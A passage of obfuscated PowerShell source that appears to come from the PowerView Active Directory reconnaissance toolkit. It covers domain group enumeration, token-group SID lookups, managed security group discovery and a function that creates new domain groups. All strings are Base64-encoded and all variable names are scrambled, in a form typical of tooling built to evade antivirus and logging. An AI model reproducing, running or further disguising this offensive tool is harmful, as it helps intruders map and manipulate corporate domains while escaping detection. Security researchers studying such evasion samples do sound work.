        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\_____/=\_/===\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    }
    PROCESS {
        if (${_/\_____/=\_/===\}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIASQBkAGUAbgB0AGkAdAB5AA==')))]) {
                if (${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    ${_/=\/\/\/==\/\/==} = ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${___/\_/\/=\/\/\/\_}
                ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                _____/\/==\/\_/=== @_/\/\/\/\___/\/\/ | % {
                    ${_/\_/=\/\/==\_/\/} = $_.GetDirectoryEntry()
                    ${_/\_/=\/\/==\_/\/}.RefreshCache($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))))
                    ${_/\_/=\/\/==\_/\/}.TokenGroups | % {
                        ${_/==\_/=\_/======} = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if (${_/==\_/=\_/======} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAzADIALQAuACoA')))) {
                            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${_/==\_/=\_/======}
                            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $False
                            if (${_/=\/\/\/==\/\/==}) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = ${_/=\/\/\/==\/\/==} }
                            ${_/==\/=\/=\/\/\/\} = _____/\/==\/\_/=== @_/\/\/\/\___/\/\/
                            if (${_/==\/=\/=\/\/\/\}) {
                                ${_/==\/=\/=\/\/\/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                                ${_/==\/=\/=\/\/\/\}
                            }
                        }
                    }
                }
            }
            else {
                ${__/\_/==\_/\/\___} = ''
                $Filter = ''
                $Identity | ? {$_} | % {
                    ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQApAA==')))
                    }
                    elseif (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AF8AXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8AXABfAF8ALwB9ACcAIABmAHIAbwBtACAAJwAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AJwA=')))
                            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                            ${_/\_____/=\_/===\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                            if (-not ${_/\_____/=\_/===\}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAXwBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwAvAH0AJwA=')))
                            }
                        }
                    }
                    elseif (${/\______/===\__/\} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        ${_/=\_/=====\__/=\} = (([Guid]${/\______/===\__/\}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                    }
                    elseif (${/\______/===\__/\}.Contains('\')) {
                        ${/=\/\/\___/==\_/=} = ${/\______/===\__/\}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | __/\/=\_/\/=\/=\_/ -_/============\/\/ Canonical
                        if (${/=\/\/\___/==\_/=}) {
                            ${____/====\_/=\_/\} = ${/=\/\/\___/==\_/=}.SubString(0, ${/=\/\/\___/==\_/=}.IndexOf('/'))
                            ${_/\/\_/===\_/=\/\} = ${/\______/===\__/\}.Split('\')[1]
                            ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAXwAvAFwALwBcAF8ALwA9AD0APQBcAF8ALwA9AFwALwBcAH0AKQA=')))
                            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/====\_/=\_/\}
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AF8AXwBfAF8ALwA9AD0APQA9AFwAXwAvAD0AXABfAC8AXAB9ACcAIABmAHIAbwBtACAAJwAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AJwA=')))
                            ${_/\_____/=\_/===\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                        }
                    }
                    else {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKQA=')))
                    }
                }
                if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGEAZABtAGkAbgBDAG8AdQBuAHQAPQAxAA==')))
                    $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]) {
                    ${__/=\__/==\___/\/} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]
                    $Filter = Switch (${__/=\__/==\___/\/}) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA0ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwA')))            { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARwBsAG8AYgBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGkAdgBlAHIAcwBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAVQBuAGkAdgBlAHIAcwBhAGwA')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA4ACkAKQA='))) }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHMAYwBvAHAAZQAgACcAJAB7AF8AXwAvAD0AXABfAF8ALwA9AD0AXABfAF8AXwAvAFwALwB9ACcA')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]) {
                    ${_/\_/\_/=====\/\/} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]
                    $Filter = Switch (${_/\_/\_/=====\/\/}) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))              { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdAByAGkAYgB1AHQAaQBvAG4A')))          { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyADEANAA3ADQAOAAzADYANAA4ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAQwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxACkAKQA='))) }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHAAcgBvAHAAZQByAHQAeQAgACcAJAB7AF8ALwBcAF8ALwBcAF8ALwA9AD0APQA9AD0AXAAvAFwALwB9ACcA')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${_/\_____/=\_/===\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGroup] filter string: $(${_/\_____/=\_/===\}.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${_/\_____/=\_/===\}.FindOne() }
                else { ${_/\__/\/=====\_/\} = ${_/\_____/=\_/===\}.FindAll() }
                ${_/\__/\/=====\_/\} | ? {$_} | % {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${_/==\/=\/=\/\/\/\} = $_
                    }
                    else {
                        ${_/==\/=\/=\/\/\/\} = _______/==\_/=\_/= -Properties $_.Properties
                    }
                    ${_/==\/=\/=\/\/\/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                    ${_/==\/=\/=\/\/\/\}
                }
                if (${_/\__/\/=====\_/\}) {
                    try { ${_/\__/\/=====\_/\}.dispose() }
                    catch {
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA=')))
                    }
                }
                ${_/\_____/=\_/===\}.dispose()
            }
        }
    }
}
function New-DomainGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${_/=====\/\/==\/\/} = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${_/\_/\__/\/\/\___} = __/=\/=\_/\/=\_/\_ @_/=====\/\/==\/\/
    if (${_/\_/\__/\/\/\___}) {
        ${_/==\/=\/=\/\/\/\} = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList (${_/\_/\__/\/\/\___}.Context)
        ${_/==\/=\/=\/\/\/\}.SamAccountName = ${_/\_/\__/\/\/\___}.Identity
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            ${_/==\/=\/=\/\/\/\}.Name = $Name
        }
        else {
            ${_/==\/=\/=\/\/\/\}.Name = ${_/\_/\__/\/\/\___}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            ${_/==\/=\/=\/\/\/\}.DisplayName = $DisplayName
        }
        else {
            ${_/==\/=\/=\/\/\/\}.DisplayName = ${_/\_/\__/\/\/\___}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            ${_/==\/=\/=\/\/\/\}.Description = $Description
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGMAcgBlAGEAdABlACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnAA==')))
        try {
            $Null = ${_/==\/=\/=\/\/\/\}.Save()
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABjAHIAZQBhAHQAZQBkAA==')))
            ${_/==\/=\/=\/\/\/\}
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnACAAOgAgACQAXwA=')))
        }
    }
}
function Get-DomainManagedSecurityGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbQBhAG4AYQBnAGUAZABCAHkAPQAqACkAKABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQApAA==')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACwAbQBhAG4AYQBnAGUAZABCAHkALABzAGEAbQBhAGMAYwBvAHUAbgB0AHQAeQBwAGUALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }
        __/\_/\/\__/==\/\_ @_/\/\/\/\___/\/\/ | % {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbgBhAG0AZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAdAB5AHAAZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAbgBhAG0AZQAsAG8AYgBqAGUAYwB0AHMAaQBkAA==')))
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $_.managedBy
            $Null = ${_/\/\/\/\___/\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA='))))
            ${/====\/\/\/\____/} = _____/\/==\/\_/=== @_/\/\/\/\___/\/\/
            ${/==\/\___/\/=\/\/} = New-Object PSObject
            ${/==\/\___/\/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $_.samaccountname
